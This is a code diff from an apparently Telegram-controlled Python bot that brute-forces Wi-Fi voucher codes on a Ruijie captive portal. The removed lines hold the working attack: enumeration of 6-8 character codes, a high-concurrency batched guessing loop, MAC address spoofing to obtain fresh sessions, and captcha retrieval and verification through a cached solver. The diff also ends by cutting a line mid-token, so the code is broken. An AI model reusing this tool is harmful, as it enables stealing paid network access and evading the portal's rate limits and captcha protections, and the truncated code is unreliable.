@@ -269,7 +269,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
     if not response:
         return
 
-    # တိကျမှန်ကန်သော Success Response အခြေအနေများကို စစ်ဆေးရန် (logonUrl ပါခြင်း၊ success:true ဖြစ်ခြင်း သို့မဟုတ် code == 0 ဖြစ်ခြင်း)
     err_code = resp_json.get("errorCode", resp_json.get("code", -1))
     is_success = (
         'logonUrl' in response or 
@@ -279,7 +278,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         '"code":0' in response
     )
 
-    # အကယ်၍ Error ဖြစ်နေပါက (ဥပမာ- Code မှားခြင်း၊ သက်တမ်းကုန်ခြင်း) is_success ကို False ပြန်လုပ်မည်
     if err_code in [1, 2, 3, 4, 400, 404, 500] or "invalid" in str(response).lower() or "expired" in str(response).lower():
         is_success = False
 
@@ -533,161 +531,4 @@ def ascii_generator(length=6):
     return "".join(random.choice(string.ascii_lowercase) for _ in range(length))
 
 def mixed_generator(length=6):
-    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
-
-def iter_codes(mode, start_digit=None):
-    if mode in ["6", "7", "8"]:
-        length = int(mode)
-        if start_digit is not None:
-            start = int(start_digit) * (10 ** (length - 1))
-            end = (int(start_digit) + 1) * (10 ** (length - 1))
-            for i in range(start, end):
-                yield str(i).zfill(length)
-            return
-        if mode in ["6", "7"]:
-            codes = [str(i).zfill(length) for i in range(10 ** length)]
-            random.shuffle(codes)
-            yield from codes
-            return
-        if mode == "8":
-            while True:
-                yield digit_generator(8)
-    if mode == "ascii-lower":
-        while True:
-            yield ascii_generator(6)
-    if mode == "all":
-        while True:
-            yield all_generator(6)
-    if mode == "mixed":
-        while True:
-            yield mixed_generator(6)
-    if mode == "mixed8":
-        while True:
-            yield mixed_generator(8)
-    raise ValueError(f"Unsupported scan mode: {mode}")
-
-def format_progress(checked, total=None, speed=0, found=0):
-    speed_str = f"{speed:,.0f} codes/min"
-    if total is not None:
-        percent = (checked / total) * 100
-        return f"🔍Scanning VOUCHER Codes...\n\n📦Checked : {checked:,}/{total:,}\n📊Progress : {percent:.2f}%\n⚡Speed : {speed_str}\n✅Success code hit : {found}"
-    return f"🔍Scanning VOUCHER Codes...\n\n📦Checked : {checked:,}\n⚡Speed : {speed_str}\n✅Success code hit : {found}"
-
-BATCH_SIZE = 1000
-
-async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
-    try:
-        code_iter = iter_codes(mode, start_digit=start_digit)
-    except ValueError as e:
-        await bot.send_message(chat_id, str(e))
-        return
-    
-    total = 10 ** int(mode) if mode in ["6", "7", "8"] else None
-    checked = 0
-    scan_start = time.monotonic()
-    global _voucher_sem
-    if _voucher_sem is None:
-        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
-
-    try:
-        while True:
-            current_task = scan_tasks.get(chat_id)
-            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
-                break
-
-            batch = [next(code_iter, None) for _ in range(BATCH_SIZE)]
-            batch = [c for c in batch if c is not None]
-            if not batch:
-                break
-
-            async def _check(code):
-                async with _voucher_sem:
-                    return await perform_check(session_url, code, chat_id, scan_id, message=message)
-
-            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
-            checked += len(batch)
-
-            found = len(success_texts.get(chat_id, []))
-            elapsed = time.monotonic() - scan_start
-            speed = (checked / elapsed * 60) if elapsed > 0 else 0
-            
-            text = format_progress(checked, total, speed, found)
-            try:
-                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
-            except Exception:
-                pass
-    finally:
-        scan_tasks.pop(chat_id, None)
-
-async def get_mac():
-    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
-    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
-    return ':'.join(f'{x:02x}' for x in mac)
-
-async def get_session_id(session, session_url, previous_session_id=None, proxy=None):
-    mac = await get_mac()
-    session_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
-    headers = {'user-agent': 'Mozilla/5.0'}
-    try:
-        async with session.get(session_url, headers=headers, allow_redirects=True, proxy=proxy) as req:
-            response = str(req.url)
-            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
-            if session_id:
-                return session_id.group(1)
-            return previous_session_id
-    except:
-        return previous_session_id
-
-async def Code_Expires_Date(active_id, proxy=None):
-    url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}"
-    headers = {'user-agent': 'Mozilla/5.0'}
-    timeout = aiohttp.ClientTimeout(total=10)
-    async with aiohttp.ClientSession(timeout=timeout) as fresh_session:
-        try:
-            async with fresh_session.get(url, headers=headers, proxy=proxy) as req:
-                if req.status == 200:
-                    respond = await req.json()
-                    if respond.get('success'):
-                        result = respond.get('result', {})
-                        raw_minutes = result.get('totalMinutes', 'Unknown')
-                        return f"⏳ Time: {raw_minutes}m", raw_minutes
-        except:
-            pass
-    return "⏳ Time: Unknown", 'Unknown'
-
-async def Captcha_Image(session, session_id, proxy=None):
-    headers = {'user-agent': 'Mozilla/5.0'}
-    params = {'sessionId': session_id, '_t': str(time.time())}
-    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, proxy=proxy) as req:
-        return await req.read()
-
-async def Captcha_Text_Cached(image_bytes):
-    return await get_captcha_from_cache(image_bytes)
-
-async def Varify_Captcha(session, session_id, text, proxy=None):
-    headers = {'content-type': 'application/json', 'user-agent': 'Mozilla/5.0'}
-    json_data = {'sessionId': session_id, 'authCode': text}
-    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, proxy=proxy) as req:
-        data = await req.json()
-        if data.get("success") is True:
-            return session_id
-        return None
-
-async def main():
-    global session, _connector
-    await load_captcha_cache()
-    
-    timeout = aiohttp.ClientTimeout(timeout=30)
-    _connector = aiohttp.TCPConnector(limit=20000, limit_per_host=10000, ssl=False)
-    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
-    
-    try:
-        asyncio.create_task(web_server())
-        await bot.infinity_polling(timeout=20, request_timeout=20)
-    finally:
-        await save_captcha_cache(force=True)
-        await session.close()
-        await _connector.close()
-
-if __name__ == '__main__':
-    asyncio.run(main())
+    return "".join(random.choice(string.ascii_lowercase + string.dig
